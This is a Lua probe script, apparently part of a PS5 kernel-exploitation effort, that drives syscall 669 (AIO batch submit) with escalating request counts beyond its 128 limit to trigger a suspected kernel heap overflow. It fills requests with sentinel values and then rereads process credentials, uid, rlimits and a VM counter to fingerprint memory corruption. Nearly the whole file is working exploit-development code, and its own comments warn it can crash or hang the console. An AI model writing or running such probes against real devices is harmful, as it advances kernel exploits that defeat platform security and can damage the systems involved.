-- CRASH_CLASS: MODERATE
-- PROBE 1404a: AIO 669 batch submit — count boundary + overflow detection
--
-- Context: 669 accepts count 1..128 per CLAUDE.md. 662 rejects count>=129.
-- The observation "count not clamped to buffer (0x14000 into 4KB overwrites heap)"
-- suggests the kernel allocates a fixed buffer and copyin overflows it.
-- This probe tests:
--   [A] What count values does 669 accept? (100..300 range)
--   [B] After each call, read process state to detect heap corruption
--   [C] Use sentinel-patterned request data to fingerprint overflow
--
-- SAFETY: starts with small counts and escalates. Each test is independent.
-- If a count causes corruption, later syscalls will reveal it.
-- A kernel heap overflow CAN crash/hang the PS5. We test carefully.

print("=== 1404a: AIO 669 count boundary ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) memory.write_dword(a, v) end
local function wq2(a, hi, lo) wd(a, lo); wd(a + 4, hi) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end

-- ============================================================
-- [A] Baseline: read process state before any AIO calls
-- ============================================================
print("[A] baseline state")

local sc_sysctl = mk(202)
local sc_getpid = mk(20)
local sc_getrlimit = mk(194)

local pid_rv = 0
pcall(function() pid_rv = N(sc_getpid()) end)
print(string.format("  pid=%d", pid_rv))

-- Read kinfo_proc for baseline
local mib = memory.alloc(16)
wd(N(mib), 1)       -- CTL_KERN
wd(N(mib)+4, 14)    -- KERN_PROC
wd(N(mib)+8, 1)     -- KERN_PROC_PID
wd(N(mib)+12, pid_rv)
local kinfo = memory.alloc(0x800)
local kinfo_n = N(kinfo)
local oldlenp = memory.alloc(8)
wd(N(oldlenp), 0x800)
for i = 0, 0x7FC, 4 do wd(kinfo_n + i, 0) end

pcall(function()
    sc_sysctl(uint64(N(mib)), uint64(4), uint64(kinfo_n),
        uint64(N(oldlenp)), uint64(0), uint64(0))
end)

-- Snapshot critical fields from kinfo_proc
local function snapshot_kinfo()
    local s = {}
    -- ki_structsize at +0
    s.structsize = rd(kinfo_n) or 0
    -- ki_flag at +0x60 (approximate)
    s.flag_60 = rd(kinfo_n + 0x60) or 0
    -- ki_uid at +0x44
    s.uid = rd(kinfo_n + 0x44) or 0
    -- ki_pid at +0x48
    s.pid = rd(kinfo_n + 0x48) or 0
    -- ki_stat at +0x76
    s.stat = rd(kinfo_n + 0x76) or 0
    -- ki_cr_flags at ~+0x264
    s.cr_flags = rd(kinfo_n + 0x264) or 0
    return s
end

local baseline = snapshot_kinfo()
print(string.format("  structsize=%d uid=%d pid=%d stat=0x%X flag=0x%X",
    baseline.structsize, baseline.uid, baseline.pid, baseline.stat, baseline.flag_60))

-- Also read some rlimits for comparison
local rlim_buf = memory.alloc(16)
local rlim_n = N(rlim_buf)
local function read_rlimit(which)
    wd(rlim_n, 0); wd(rlim_n+4, 0); wd(rlim_n+8, 0); wd(rlim_n+12, 0)
    local ok, rv = pcall(function()
        return sc_getrlimit(uint64(which), uint64(rlim_n))
    end)
    return (ok and N(rv) or -999), rd(rlim_n) or 0, rd(rlim_n+4) or 0
end

local rl_rv, rl_lo, rl_hi = read_rlimit(4) -- RLIMIT_MEMLOCK
print(string.format("  rlimit_memlock: rv=%d val=0x%X%08X", rl_rv, rl_hi, rl_lo))

-- sys 624 VM counter as canary
local sc_624 = mk(624)
local vm_baseline = 0
pcall(function() vm_baseline = N(sc_624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))) end)
print(string.format("  sys624_vm=%d", vm_baseline))

-- ============================================================
-- [B] Test AIO 669 with increasing count values
-- ============================================================
print("")
print("[B] 669 count boundary test")

local sc_669 = mk(669)
local STRIDE = 0x28 -- request stride (40 bytes)

-- Allocate request buffer large enough for max count
local MAX_TEST = 300
local req_buf = memory.alloc(MAX_TEST * STRIDE + 64)
local req_n = N(req_buf)

-- Allocate ID output buffer
local id_buf = memory.alloc(MAX_TEST * 4 + 64)
local id_n = N(id_buf)

-- Fill request buffer with sentinel pattern: each request has a unique marker
local function fill_requests(count, sentinel_hi, sentinel_lo)
    for i = 0, count - 1 do
        local base = req_n + i * STRIDE
        -- Request layout (0x28 bytes):
        -- We fill with our sentinel per-entry
        -- cmd=1 (read), fd=-1, buf=0, off=0, size=0, ...
        wd(base + 0x00, 1)            -- cmd = read
        wd(base + 0x04, 0xFFFFFFFF)   -- fd = -1 (invalid, should fail gracefully)
        wd(base + 0x08, 0)            -- buf lo
        wd(base + 0x0C, 0)            -- buf hi
        wd(base + 0x10, 0)            -- offset lo
        wd(base + 0x14, 0)            -- offset hi
        wd(base + 0x18, 0)            -- size lo
        wd(base + 0x1C, 0)            -- size hi
        wd(base + 0x20, sentinel_lo + i)  -- sentinel marker in padding
        wd(base + 0x24, sentinel_hi)      -- sentinel hi
    end
end

-- Test each count value
local counts = {50, 100, 110, 120, 128, 129, 130, 140, 150, 160, 200, 256}

for _, count in ipairs(counts) do
    -- Clear ID buffer
    for i = 0, count * 4 - 1, 4 do wd(id_n + i, 0xDEAD) end

    -- Fill requests with count-specific sentinel
    fill_requests(count, 0xBEEF0000 + count, 0xCAFE0000)

    -- Call 669: (cmd=1, reqs, count, class=1, ids)
    local ok, rv = pcall(function()
        return sc_669(
            uint64(1),              -- cmd = read
            uint64(req_n),          -- request array
            uint64(count),          -- count
            uint64(1),              -- class
            uint64(id_n)            -- output IDs
        )
    end)

    local ret = ok and N(rv) or -999
    -- Check first few IDs
    local id0 = rd(id_n) or 0
    local id1 = rd(id_n + 4) or 0
    local id_last = rd(id_n + (count-1)*4) or 0

    print(string.format("  count=%3d: rv=%2d  id[0]=0x%08X id[1]=0x%08X id[%d]=0x%08X",
        count, ret, id0, id1, count-1, id_last))

    -- After each call, re-read kinfo_proc to check for corruption
    wd(N(oldlenp), 0x800)
    for i = 0, 0x7FC, 4 do wd(kinfo_n + i, 0xAA) end
    pcall(function()
        sc_sysctl(uint64(N(mib)), uint64(4), uint64(kinfo_n),
            uint64(N(oldlenp)), uint64(0), uint64(0))
    end)
    local post = snapshot_kinfo()

    -- Check for changes
    local changed = false
    if post.structsize ~= baseline.structsize then
        print(string.format("    !! structsize changed: %d → %d", baseline.structsize, post.structsize))
        changed = true
    end
    if post.uid ~= baseline.uid then
        print(string.format("    !! uid changed: %d → %d", baseline.uid, post.uid))
        changed = true
    end
    if post.pid ~= baseline.pid then
        print(string.format("    !! pid changed: %d → %d", baseline.pid, post.pid))
        changed = true
    end
    if post.flag_60 ~= baseline.flag_60 then
        print(string.format("    !! flag@0x60 changed: 0x%X → 0x%X", baseline.flag_60, post.flag_60))
        changed = true
    end
    if post.cr_flags ~= baseline.cr_flags then
        print(string.format("    !! cr_flags changed: 0x%X → 0x%X", baseline.cr_flags, post.cr_flags))
        changed = true
    end

    -- Check rlimit
    local rl2_rv, rl2_lo, rl2_hi = read_rlimit(4)
    if rl2_lo ~= rl_lo or rl2_hi ~= rl_hi then
        print(string.format("    !! rlimit changed: 0x%X%08X → 0x%X%08X", rl_hi, rl_lo, rl2_hi, rl2_lo))
        changed = true
    end

    -- Check VM counter
    local vm_post = 0
    pcall(function() vm_post = N(sc_624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))) end)
    local vm_delta = vm_post - vm_baseline
    if vm_delta ~= 0 then
        print(string.format("    vm_delta=%d", vm_delta))
    end
    vm_baseline = vm_post

    if not changed then
        -- silently OK
    end

    -- If rv = -999, process might have crashed mid-call, stop
    if ret == -999 then
        print("    !! pcall failed — stopping escalation")
        break
    end
end

-- ============================================================
-- [C] Final state check
-- ============================================================
print("")
print("[C] final state")

-- Re-read kinfo_proc one more time
wd(N(oldlenp), 0x800)
for i = 0, 0x7FC, 4 do wd(kinfo_n + i, 0) end
pcall(function()
    sc_sysctl(uint64(N(mib)), uint64(4), uint64(kinfo_n),
        uint64(N(oldlenp)), uint64(0), uint64(0))
end)
local final = snapshot_kinfo()
print(string.format("  structsize=%d uid=%d pid=%d stat=0x%X flag=0x%X",
    final.structsize, final.uid, final.pid, final.stat, final.flag_60))

-- Check if getpid still works (basic process health)
local pid2 = 0
pcall(function() pid2 = N(sc_getpid()) end)
print(string.format("  getpid=%d (baseline=%d) %s", pid2, pid_rv,
    pid2 == pid_rv and "OK" or "CHANGED"))

-- Scan for sentinel values in kinfo_proc
print("")
print("[D] sentinel scan in kinfo_proc")
local found_sentinel = false
for i = 0, 0x440, 4 do
    local v = rd(kinfo_n + i) or 0
    if v >= 0xBEEF0000 and v <= 0xBEEF0200 then
        print(string.format("  !! SENTINEL at kinfo+0x%03X: 0x%08X (count=%d)", i, v, v - 0xBEEF0000))
        found_sentinel = true
    end
    if v >= 0xCAFE0000 and v <= 0xCAFE0200 then
        print(string.format("  !! SENTINEL at kinfo+0x%03X: 0x%08X", i, v))
        found_sentinel = true
    end
end
if not found_sentinel then
    print("  no sentinels found in kinfo_proc (expected)")
end

print("")
print("=== 1404a DONE ===")
